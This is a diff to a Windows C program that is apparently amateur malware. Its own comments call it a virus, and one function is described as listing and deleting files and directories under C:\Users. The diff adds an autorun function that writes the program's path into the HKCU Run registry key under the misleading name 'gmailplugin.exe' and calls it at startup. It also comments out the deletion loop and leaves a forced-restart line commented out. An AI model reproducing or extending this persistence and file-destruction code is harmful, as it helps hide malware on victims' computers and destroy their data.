@@ -7,6 +7,28 @@
 # include <windows.h>
 # include <dirent.h>
 
+int autorun(){// add virus to registry to start with windows start
+
+HKEY hKey;
+const char* czStartName = "gmailplugin.exe";
+const char* czExePath   = _pgmptr;
+
+LONG lnRes = RegOpenKeyEx(  HKEY_CURRENT_USER,
+                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+                            0 , KEY_WRITE,
+                            &hKey);
+if( ERROR_SUCCESS == lnRes )
+{
+    lnRes = RegSetValueEx(  hKey,
+                            czStartName,
+                            0,
+                            REG_SZ,
+                            (unsigned char*)czExePath,
+                            strlen(czExePath) );
+}
+
+RegCloseKey(hKey);
+}
 int rem(char s[50]){  // this function creates list of files and directories and should delete it
 	FILE* ff;
 	struct dirent *entry;
@@ -45,9 +67,10 @@ int rem(char s[50]){  // this function creates list of files and directories and
 		}
 }
 int main (){
+	autorun();
 	int x = 1;
 	int t = 8;
-	while (t--){  // this loop allows to find specific locations
+/*	while (t--){  // this loop allows to find specific locations
 	if(x==1) {
 	char a[50] = "C:\\Users";
 	rem(a);
@@ -78,6 +101,6 @@ int main (){
 	}
 //	rem(a);
 	x++;
-	}
-//system("shutdown -r -t 00");    // should restar computer
+	}*/
+//system("shutdown -r -t 00");    // should restart computer
 }
